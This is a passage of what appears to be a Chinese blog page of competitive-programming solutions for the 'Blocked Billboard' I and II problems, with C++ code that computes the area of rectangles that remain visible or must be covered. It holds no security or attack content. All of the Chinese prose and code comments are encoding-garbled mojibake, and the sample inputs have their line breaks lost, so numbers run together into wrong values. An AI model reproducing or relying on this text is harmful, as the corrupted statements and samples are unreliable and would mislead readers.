¼çš„å¤§ç²’è°·ç‰©â€ã€‚</p><p>å¹¿å‘Šç‰Œä¸Šè¿™ä¸¤ç§ç²¾ç¾çš„ç‰›é¥²æ–™çœ‹ä¸Šå»æ¯”å†œåœºé‡Œçš„è‰ç¾å‘³çš„å¤šã€‚</p><p>æœ‰ä¸€å¤©ï¼Œå½“è´èŒœå‡è§†ç€çª—å¤–æ—¶ï¼Œå¥¹æƒŠå¼‚åœ°çœ‹åˆ°ä¸€è¾†å·¨å¤§çš„çŸ©å½¢å¡è½¦åœåœ¨é©¬è·¯å¯¹é¢ã€‚</p><p>å¡è½¦çš„ä¾§é¢æœ‰ä¸€ä¸ªå¹¿å‘Šï¼Œä¸Šé¢å†™ç€â€œå†œå¤«å²å¯†æ–¯çš„ç²¾æ¹›ç‰›æ’â€ã€‚</p><p>è´èŒœå¯¹æ­¤ä¸å¤ªæ„Ÿå…´è¶£ï¼Œä½†å¥¹éå¸¸æ‹…å¿ƒå¡è½¦å¯èƒ½ä¼šé˜»æŒ¡å¥¹è§‚çœ‹æœ€å–œæ¬¢çš„ä¸¤ä¸ªå¹¿å‘Šç‰Œçš„è§†é‡ã€‚</p><p>ç»™å®šä¸¤ä¸ªå¹¿å‘Šç‰Œçš„ä½ç½®å’Œå¡è½¦çš„ä½ç½®ï¼Œè¯·è®¡ç®—ä¸¤ä¸ªå¹¿å‘Šç‰Œçš„ä»ç„¶å¯è§çš„æ€»é¢ç§¯ã€‚</p><p>å¡è½¦å¯èƒ½æŒ¡åˆ°ä¸¤ä¸ªå¹¿å‘Šç‰Œæˆ–åªæŒ¡åˆ°å…¶ä¸­ä¸€ä¸ªï¼Œæˆ–éƒ½æŒ¡ä¸åˆ°ã€‚</p><h4 id="è¾“å…¥æ ¼å¼-2"><a href="#è¾“å…¥æ ¼å¼-2" class="headerlink" title="è¾“å…¥æ ¼å¼"></a>è¾“å…¥æ ¼å¼</h4><p>ç¬¬ä¸€è¡ŒåŒ…å«å››ä¸ªæ•´æ•° $x_1,y_1,x_2,y_2$ï¼Œå…¶ä¸­ $(x_1,y_1)$ å’Œ $(x_2,y_2)$ è¡¨ç¤ºåœ¨è´èŒœçš„äºŒç»´è§†é‡ä¸­ï¼Œç¬¬ä¸€ä¸ªå¹¿å‘Šç‰Œçš„å·¦ä¸‹è§’å’Œå³ä¸Šè§’åæ ‡ã€‚</p><p>ç¬¬äºŒè¡ŒæŒ‰ç…§å¦‚ä¸Šå½¢å¼ï¼ŒåŒ…å«å››ä¸ªæ•´æ•°ï¼Œè¡¨ç¤ºç¬¬äºŒä¸ªå¹¿å‘Šç‰Œçš„å·¦ä¸‹è§’å’Œå³ä¸Šè§’åæ ‡ã€‚</p><p>ç¬¬ä¸‰è¡ŒæŒ‰ç…§å¦‚ä¸Šå½¢å¼ï¼ŒåŒ…å«å››ä¸ªæ•´æ•°ï¼Œè¡¨ç¤ºå¡è½¦ä¾§é¢çš„å·¦ä¸‹è§’å’Œå³ä¸Šè§’åæ ‡ã€‚</p><h4 id="è¾“å‡ºæ ¼å¼-2"><a href="#è¾“å‡ºæ ¼å¼-2" class="headerlink" title="è¾“å‡ºæ ¼å¼"></a>è¾“å‡ºæ ¼å¼</h4><p>è¾“å‡ºä¸¤ä¸ªå¹¿å‘Šç‰Œçš„ä»ç„¶å¯è§çš„æ€»é¢ç§¯ã€‚</p><h4 id="æ•°æ®èŒƒå›´-1"><a href="#æ•°æ®èŒƒå›´-1" class="headerlink" title="æ•°æ®èŒƒå›´"></a>æ•°æ®èŒƒå›´</h4><p>$-1000 \le x_1,y_1,x_2,y_2 \le 1000$,<br>ä¿è¯ä¸¤ä¸ªå¹¿å‘Šç‰Œä¹‹é—´é‡å é¢ç§¯ä¸º $0$ã€‚</p><h4 id="è¾“å…¥æ ·ä¾‹ï¼š-2"><a href="#è¾“å…¥æ ·ä¾‹ï¼š-2" class="headerlink" title="è¾“å…¥æ ·ä¾‹ï¼š"></a>è¾“å…¥æ ·ä¾‹ï¼š</h4><pre class="line-numbers language-none"><code class="language-none">1 2 3 56 0 10 42 1 8 3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="è¾“å‡ºæ ·ä¾‹ï¼š-2"><a href="#è¾“å‡ºæ ·ä¾‹ï¼š-2" class="headerlink" title="è¾“å‡ºæ ·ä¾‹ï¼š"></a>è¾“å‡ºæ ·ä¾‹ï¼š</h4><pre class="line-numbers language-none"><code class="language-none">17<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="æ ·ä¾‹è§£é‡Š-2"><a href="#æ ·ä¾‹è§£é‡Š-2" class="headerlink" title="æ ·ä¾‹è§£é‡Š"></a>æ ·ä¾‹è§£é‡Š</h4><p>ç¬¬ä¸€å—å¹¿å‘Šç‰Œçš„å¯è§é¢ç§¯ä¸º $5$ï¼Œç¬¬äºŒå—å¹¿å‘Šç‰Œçš„å¯è§é¢ç§¯ä¸º $12$ã€‚</p><h4 id="é¢˜è§£-2"><a href="#é¢˜è§£-2" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h4><p>æ•°æ®é‡ä¸å¤§ï¼Œç®€å•çš„æ¨¡æ‹Ÿï¼Œå°†ä¸¤ä¸ªå¹¿å‘Šç‰Œçš„ä½ç½®æ ‡ä¸º $1$ï¼Œå¡è½¦çš„ä½ç½®æ ‡ä¸º $0$ï¼Œæˆ‘ä»¬åªéœ€è¦éå†ä¸€ç‰‡æ•°ç»„ï¼Œæ‰¾å‡º $1$ çš„ä¸ªæ•°å³å¯</p><p>ç±»ä¼¼äºè¿™ä¸ªæ ·å­ï¼š</p><img src="55289_b63245c6af-2.PNG" style="zoom: 80%;"><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream&gt;</span></span>using namespace std<span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token keyword">int</span> N <span class="token operator">=</span> <span class="token number">2010</span><span class="token punctuation">;</span><span class="token keyword">int</span> g<span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> x1<span class="token punctuation">,</span> y1<span class="token punctuation">,</span> x2<span class="token punctuation">,</span> y2<span class="token punctuation">;</span><span class="token keyword">int</span> a1<span class="token punctuation">,</span> b1<span class="token punctuation">,</span> a2<span class="token punctuation">,</span> b2<span class="token punctuation">;</span><span class="token keyword">int</span> u1<span class="token punctuation">,</span> v1<span class="token punctuation">,</span> u2<span class="token punctuation">,</span> v2<span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    cin <span class="token operator">&gt;&gt;</span> x1 <span class="token operator">&gt;&gt;</span> y1 <span class="token operator">&gt;&gt;</span> x2 <span class="token operator">&gt;&gt;</span> y2<span class="token punctuation">;</span>    x1 <span class="token operator">+=</span> <span class="token number">1000</span><span class="token punctuation">;</span><span class="token comment">//æ•°æ®ä¸­æœ‰è´Ÿæ•°ï¼Œå…¨éƒ¨è½¬æ¢æˆæ•´æ•°</span>    x2 <span class="token operator">+=</span> <span class="token number">1000</span><span class="token punctuation">;</span>    y1 <span class="token operator">+=</span> <span class="token number">1000</span><span class="token punctuation">;</span>    y2 <span class="token operator">+=</span> <span class="token number">1000</span><span class="token punctuation">;</span>    cin <span class="token operator">&gt;&gt;</span> a1 <span class="token operator">&gt;&gt;</span> b1 <span class="token operator">&gt;&gt;</span> a2 <span class="token operator">&gt;&gt;</span> b2<span class="token punctuation">;</span>    a1 <span class="token operator">+=</span> <span class="token number">1000</span><span class="token punctuation">;</span><span class="token comment">//æ•°æ®ä¸­æœ‰è´Ÿæ•°ï¼Œå…¨éƒ¨è½¬æ¢æˆæ•´æ•°</span>    a2 <span class="token operator">+=</span> <span class="token number">1000</span><span class="token punctuation">;</span>    b1 <span class="token operator">+=</span> <span class="token number">1000</span><span class="token punctuation">;</span>    b2 <span class="token operator">+=</span> <span class="token number">1000</span><span class="token punctuation">;</span>    cin <span class="token operator">&gt;&gt;</span> u1 <span class="token operator">&gt;&gt;</span> v1 <span class="token operator">&gt;&gt;</span> u2 <span class="token operator">&gt;&gt;</span> v2<span class="token punctuation">;</span>    u1 <span class="token operator">+=</span> <span class="token number">1000</span><span class="token punctuation">;</span><span class="token comment">//æ•°æ®ä¸­æœ‰è´Ÿæ•°ï¼Œå…¨éƒ¨è½¬æ¢æˆæ•´æ•°</span>    u2 <span class="token operator">+=</span> <span class="token number">1000</span><span class="token punctuation">;</span>    v1 <span class="token operator">+=</span> <span class="token number">1000</span><span class="token punctuation">;</span>    v2 <span class="token operator">+=</span> <span class="token number">1000</span><span class="token punctuation">;</span>       <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> N<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> N<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>i <span class="token operator">&gt;</span> x1 <span class="token operator">&amp;&amp;</span> i <span class="token operator">&lt;=</span> x2 <span class="token operator">&amp;&amp;</span> j <span class="token operator">&gt;</span> y1 <span class="token operator">&amp;&amp;</span> j <span class="token operator">&lt;=</span> y2<span class="token punctuation">)</span> <span class="token comment">//æ”¾ç¬¬ä¸€ä¸ªå¹¿å‘Šç‰Œ</span>                g<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>i <span class="token operator">&gt;</span> a1 <span class="token operator">&amp;&amp;</span> i <span class="token operator">&lt;=</span> a2 <span class="token operator">&amp;&amp;</span> j <span class="token operator">&gt;</span> b1 <span class="token operator">&amp;&amp;</span> j <span class="token operator">&lt;=</span> b2<span class="token punctuation">)</span><span class="token comment">//æ”¾ç¬¬äºŒä¸ªå¹¿å‘Šç‰Œ</span>                g<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>i <span class="token operator">&gt;</span> u1 <span class="token operator">&amp;&amp;</span> i <span class="token operator">&lt;=</span> u2 <span class="token operator">&amp;&amp;</span> j <span class="token operator">&gt;</span> v1 <span class="token operator">&amp;&amp;</span> j <span class="token operator">&lt;=</span> v2<span class="token punctuation">)</span><span class="token comment">//æ”¾å¡è½¦</span>                g<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">int</span> res <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> N<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> N<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            res <span class="token operator">+=</span> g<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    cout <span class="token operator">&lt;&lt;</span> res<span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ­£è§„çš„åšæ³•å°±æ˜¯ä¸€é“æ•°å­¦é¢˜</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream&gt;</span></span>using namespace std<span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">Rect</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> x1<span class="token punctuation">,</span> y1<span class="token punctuation">,</span> x2<span class="token punctuation">,</span> y2<span class="token punctuation">;</span>    <span class="token keyword">int</span> <span class="token function">area</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span>y2 <span class="token operator">-</span> y1<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>x2 <span class="token operator">-</span> x1<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">intersect</span><span class="token punctuation">(</span>Rect p<span class="token punctuation">,</span> Rect q<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> xOverlap <span class="token operator">=</span> <span class="token function">max</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">min</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span>x2<span class="token punctuation">,</span> q<span class="token punctuation">.</span>x2<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token function">max</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span>x1<span class="token punctuation">,</span> q<span class="token punctuation">.</span>x1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> yOverlap <span class="token operator">=</span> <span class="token function">max</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">min</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span>y2<span class="token punctuation">,</span> q<span class="token punctuation">.</span>y2<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token function">max</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span>y1<span class="token punctuation">,</span> q<span class="token punctuation">.</span>y1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> xOverlap <span class="token operator">*</span> yOverlap<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    Rect a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> t<span class="token punctuation">;</span>      cin <span class="token operator">&gt;&gt;</span> a<span class="token punctuation">.</span>x1 <span class="token operator">&gt;&gt;</span> a<span class="token punctuation">.</span>y1 <span class="token operator">&gt;&gt;</span> a<span class="token punctuation">.</span>x2 <span class="token operator">&gt;&gt;</span> a<span class="token punctuation">.</span>y2<span class="token punctuation">;</span>    cin <span class="token operator">&gt;&gt;</span> b<span class="token punctuation">.</span>x1 <span class="token operator">&gt;&gt;</span> b<span class="token punctuation">.</span>y1 <span class="token operator">&gt;&gt;</span> b<span class="token punctuation">.</span>x2 <span class="token operator">&gt;&gt;</span> b<span class="token punctuation">.</span>y2<span class="token punctuation">;</span>    cin <span class="token operator">&gt;&gt;</span> t<span class="token punctuation">.</span>x1 <span class="token operator">&gt;&gt;</span> t<span class="token punctuation">.</span>y1 <span class="token operator">&gt;&gt;</span> t<span class="token punctuation">.</span>x2 <span class="token operator">&gt;&gt;</span> t<span class="token punctuation">.</span>y2<span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> a<span class="token punctuation">.</span><span class="token function">area</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> b<span class="token punctuation">.</span><span class="token function">area</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token function">intersect</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> t<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token function">intersect</span><span class="token punctuation">(</span>b<span class="token punctuation">,</span> t<span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="é˜»æŒ¡å¹¿å‘Šç‰Œ-II"><a href="#é˜»æŒ¡å¹¿å‘Šç‰Œ-II" class="headerlink" title="é˜»æŒ¡å¹¿å‘Šç‰Œ II"></a>é˜»æŒ¡å¹¿å‘Šç‰Œ II</h2><p>å¥¶ç‰›è´èŒœæ›¾ç»ä»å†œåœºä¸­å‘å¤–çœ‹å»ï¼Œå¯ä»¥çœ‹åˆ°ä¸¤ä¸ªåˆŠç™»ç€ç¾å‘³çš„ç‰›é¥²æ–™å¹¿å‘Šçš„å¹¿å‘Šç‰Œï¼Œè¿™ä»¤å¥¹éå¸¸æ»¡æ„ã€‚</p><p>ä¸å¹¸çš„æ˜¯ï¼Œå…¶ä¸­ä¸€ä¸ªå¹¿å‘Šç‰Œæœ€è¿‘å·²æ›´æ–°ï¼Œç°åœ¨åˆŠç™»ç€å¹¿å‘Šâ€œå†œæ°‘æ‹‰é‡Œçš„å‰²è‰æœºâ€ã€‚</p><p>ä½†æ˜¯è´èŒœå¯ä¸å–œæ¬¢å‰²è‰æœºï¼Œè¿™äº›å‰²è‰æœºåªä¼šæŠŠå¥¹çˆ±åƒçš„è‰å‰²çš„ä¸€å¹²äºŒå‡€ã€‚</p><p>å¹¸è¿çš„æ˜¯ï¼Œå‰©ä¸‹çš„ç‰›é¥²æ–™å¹¿å‘Šç‰Œä½äºå‰²è‰æœºå¹¿å‘Šç‰Œçš„å‰é¢ï¼Œæœ‰å¯èƒ½å°†å…¶é®æŒ¡ä½ã€‚</p><p>è´èŒœå¸Œæœ›è¿™ä¸ªè®¨åŒçš„å‰²è‰æœºå¹¿å‘Šç‰Œèƒ½å¤Ÿå®Œå…¨ä»è‡ªå·±çš„è§†çº¿ä¸­æ¶ˆå¤±ï¼Œå¹¶ä¸ºæ­¤åˆ¶å®šäº†ä¸€ä¸ªå†’é™©è®¡åˆ’ã€‚</p><p>å¥¹è®¡åˆ’ä»è°·ä»“é‡Œå·ä¸€ä¸ªå¤§çš„çŸ©å½¢é˜²æ°´å¸ƒï¼Œå¹¶åœ¨æ·±å¤œå·å·æºœèµ°ï¼Œç”¨å®ƒè¦†ç›–å‰²è‰æœºå¹¿å‘Šç‰Œçš„å…¶ä½™éƒ¨åˆ†ï¼Œä½¿å¾—å¥¹èƒ½å®Œå…¨çœ‹ä¸åˆ°å‰²è‰æœºå¹¿å‘Šç‰Œã€‚</p><p>ç»™å®šä¸¤ä¸ªå¹¿å‘Šç‰Œçš„ä½ç½®ï¼Œè¯·å¸®åŠ©è´èŒœè®¡ç®—å¥¹æ‰€éœ€è¦çš„é˜²æ°´å¸ƒçš„æœ€å°é¢ç§¯ã€‚</p><p>ç”±äºè°·ä»“ä¸­åªæœ‰çŸ©å½¢çš„é˜²æ°´å¸ƒï¼Œå› æ­¤è´èŒœå‘ç°ä¸ºäº†å°†å‰²è‰æœºå¹¿å‘Šç‰Œå®Œå…¨é®ç›–ï¼Œæ‰€éœ€çš„é˜²æ°´å¸ƒé¢ç§¯å¯èƒ½ä¼šå¤§äºå‰²è‰æœºå¹¿å‘Šç‰Œçš„è£¸éœ²é¢ç§¯ï¼Œå¦‚ä¸‹ä¾‹æ‰€ç¤ºã€‚</p><p>é˜²æ°´å¸ƒåœ¨æ”¾ç½®æ—¶ï¼Œå…¶è¾¹å¿…é¡»ä¸å¹¿å‘Šç‰Œçš„è¾¹å¹³è¡Œï¼Œå³ä¸èƒ½å€¾æ–œæ”¾ç½®ã€‚</p><h4 id="è¾“å…¥æ ¼å¼-3"><a href="#è¾“å…¥æ ¼å¼-3" class="headerlink" title="è¾“å…¥æ ¼å¼"></a>è¾“å…¥æ ¼å¼</h4><p>ç¬¬ä¸€è¡ŒåŒ…å«å››ä¸ªæ•´æ•° $x_1,y_1,x_2,y_2$ï¼Œå…¶ä¸­ $(x_1,y_1)$ å’Œ $(x_2,y_2)$ è¡¨ç¤ºå‰²è‰æœºå¹¿å‘Šç‰Œçš„å·¦ä¸‹è§’å’Œå³ä¸Šè§’åæ ‡ã€‚</p><p>ç¬¬äºŒè¡ŒæŒ‰ç…§å¦‚ä¸Šå½¢å¼ï¼ŒåŒ…å«å››ä¸ªæ•´æ•°ï¼Œè¡¨ç¤ºç‰›é¥²æ–™å¹¿å‘Šç‰Œçš„å·¦ä¸‹è§’å’Œå³ä¸Šè§’åæ ‡ã€‚</p><p>ç‰›é¥²æ–™å¹¿å‘Šç‰Œå¯èƒ½å®Œå…¨é®ç›–äº†å‰²è‰æœºå¹¿å‘Šç‰Œï¼Œæˆ–éƒ¨åˆ†é®ç›–äº†å‰²è‰æœºå¹¿å‘Šç‰Œï¼Œä¹Ÿå¯èƒ½å®Œå…¨æ²¡æœ‰é®ç›–å‰²è‰æœºå¹¿å‘Šç‰Œã€‚</p><h4 id="è¾“å‡ºæ ¼å¼-3"><a href="#è¾“å‡ºæ ¼å¼-3" class="headerlink" title="è¾“å‡ºæ ¼å¼"></a>è¾“å‡ºæ ¼å¼</h4><p>è¾“å‡ºç”¨æ¥é®ç›–å‰²è‰æœºå¹¿å‘Šç‰Œçš„é˜²æ°´å¸ƒçš„æœ€å°é¢ç§¯ã€‚</p><h4 id="æ•°æ®èŒƒå›´-2"><a href="#æ•°æ®èŒƒå›´-2" class="headerlink" title="æ•°æ®èŒƒå›´"></a>æ•°æ®èŒƒå›´</h4><p>$-1000 \le x_1,y_1,x_2,y_2 \le 1000$</p><h4 id="è¾“å…¥æ ·ä¾‹ï¼š-3"><a href="#è¾“å…¥æ ·ä¾‹ï¼š-3" class="headerlink" title="è¾“å…¥æ ·ä¾‹ï¼š"></a>è¾“å…¥æ ·ä¾‹ï¼š</h4><pre class="line-numbers language-none"><code class="language-none">2 1 7 45 -1 10 3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="è¾“å‡ºæ ·ä¾‹ï¼š-3"><a href="#è¾“å‡ºæ ·ä¾‹ï¼š-3" class="headerlink" title="è¾“å‡ºæ ·ä¾‹ï¼š"></a>è¾“å‡ºæ ·ä¾‹ï¼š</h4><pre class="line-numbers language-none"><code class="language-none">15<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="æ ·ä¾‹è§£é‡Š-3"><a href="#æ ·ä¾‹è§£é‡Š-3" class="headerlink" title="æ ·ä¾‹è§£é‡Š"></a>æ ·ä¾‹è§£é‡Š</h4><p>è™½ç„¶ç‰›é¥²æ–™å¹¿å‘Šç‰Œé®ç›–ä½äº†å‰²è‰æœºå¹¿å‘Šç‰Œçš„å³ä¸‹è§’çš„ä¸€éƒ¨åˆ†ï¼Œä½†è¿™å¹¶æ²¡æœ‰èµ·åˆ°ä½œç”¨ã€‚</p><p>æƒ³è¦å®Œå…¨é®ç›–å‰²è‰æœºå¹¿å‘Šç‰Œï¼Œä»ç„¶éœ€è¦ä¸€å—å’Œå®ƒå°ºå¯¸ç›¸åŒçš„é˜²æ°´å¸ƒã€‚</p><h4 id="é¢˜è§£-3"><a href="#é¢˜è§£-3" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h4><p>å¯ä»¥å’Œä¸Šä¸€é¢˜ç”¨æ¨¡æ‹Ÿï¼Œä»£ç ç•¥</p><p>ä¹Ÿå¯ä»¥åˆ†ç±»è®¨è®º</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream&gt;</span></span>using namespace std<span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> x<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">,</span> y<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span> i<span class="token operator">&lt;=</span><span class="token number">4</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>        cin<span class="token operator">&gt;&gt;</span>x<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">&gt;&gt;</span>y<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment">//åˆ†ç±»è®¨è®º</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>x<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">&gt;=</span>x<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> x<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">&lt;=</span>x<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> y<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">&gt;=</span>y<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> y<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">&lt;=</span>y<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        cout<span class="token operator">&lt;&lt;</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token comment">//å®Œå…¨è¦†ç›–</span>    <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>x<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">&lt;=</span>x<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> y<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">&lt;=</span>y<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> y<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">&gt;</span>y<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> x<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">&gt;=</span>x<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        cout<span class="token operator">&lt;&lt;</span><span class="token punctuation">(</span>x<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">-</span>x<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>y<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">-</span>y<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//ä¸Šæ–¹æœªè¦†ç›–</span>    <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>y<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">&lt;</span>y<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> x<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">&lt;=</span>x<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> y<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">&gt;=</span>y<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> x<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">&gt;=</span>x<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        cout<span class="token operator">&lt;&lt;</span><span class="token punctuation">(</span>x<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">-</span>x<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>y<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">-</span>y<span class="token 